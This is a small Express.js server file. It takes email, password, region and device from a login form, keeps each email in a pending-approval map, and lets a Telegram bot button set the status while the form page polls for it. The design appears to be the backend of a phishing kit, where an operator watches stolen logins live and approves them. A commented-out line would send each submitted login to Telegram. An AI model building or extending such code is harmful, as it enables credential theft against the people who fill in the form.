import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { sendLoginTelegram } from "./bot.js";

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

export const pendingApprovals = {}; // { email: { status: 'pending'|'accepted'|'rejected' } }

// Send login request
app.post("/send-login", async (req, res) => {
  const { email, password, region, device } = req.body;
  if (!email || !password) return res.status(400).send({ error: "Missing email or password" });

  pendingApprovals[email] = { status: "pending" };

  // Remove this line to prevent backend Telegram message from going first
  // await sendLoginTelegram(email);

  res.json({ status: "ok" });
});

// Check status polling
app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

// Update status from Telegram button
app.post("/update-status", (req, res) => {
  const { email, status } = req.body;
  if (!email || !pendingApprovals[email]) return res.status(400).send({ error: "Invalid email" });
  pendingApprovals[email].status = status;
  res.json({ status: "ok" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

